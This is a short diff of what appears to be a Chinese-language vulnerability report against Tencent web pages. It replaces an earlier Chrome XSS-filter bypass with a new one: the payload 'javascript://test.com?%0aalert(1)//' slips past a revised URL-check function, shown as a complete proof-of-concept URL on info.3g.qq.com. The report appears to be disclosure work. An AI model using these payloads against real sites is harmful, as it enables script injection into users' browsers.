@@ -1,4 +1,8 @@
-利用chrome xss filter bypass
-http://mho.qq.com/wx/page_binding.shtml?back=javascript:alert(1)&test=%3Cscript%3Efunction%20AQ_SECAPI_ESCAPE(Url%2C%20map)%20%7B
+修改后的check url的函数有问题： 例如 这样的url: javascript://test.com?%0aalert(1)//
 
-chrome下测试，过程跟之前一样
+
+poc
+
+http://info.3g.qq.com/g/s?aid=image&g_f=22053#bigpic/channel=manual&tunnel=1&tunnelval=manual&index=4&newsid=ent_20151107029055&fromout=0&backuri=javascript%3A%2F%2Ftest.com%3F%250aalert(1)%2F%2F
+
+仍然可以绕过你们的检查
